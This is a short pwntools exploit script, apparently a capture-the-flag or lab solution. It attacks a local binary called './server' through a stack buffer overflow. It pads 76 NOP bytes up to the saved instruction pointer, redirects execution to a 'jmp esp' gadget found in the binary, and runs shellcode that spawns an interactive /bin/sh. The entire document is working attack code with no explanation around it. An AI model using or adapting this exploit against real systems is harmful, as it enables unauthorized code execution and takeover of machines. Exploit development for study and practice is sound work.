from pwn import *

prcs = './server'
elf = context.binary = ELF(prcs, checksec=False)
context.log_level = 'debug'

p = process(prcs)

eip_offset = 76

jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())

payload = flat(
    asm('nop') * eip_offset,
    jmp_esp,
    asm('nop') * 10, # padding
    shellcode
)

print('#'*30)
print('Shellcode in hex format:', ''.join(f'\\x{b:02x}' for b in shellcode))
print(disasm(shellcode))
print('#'*30)

p.sendlineafter(b':', payload)
p.interactive()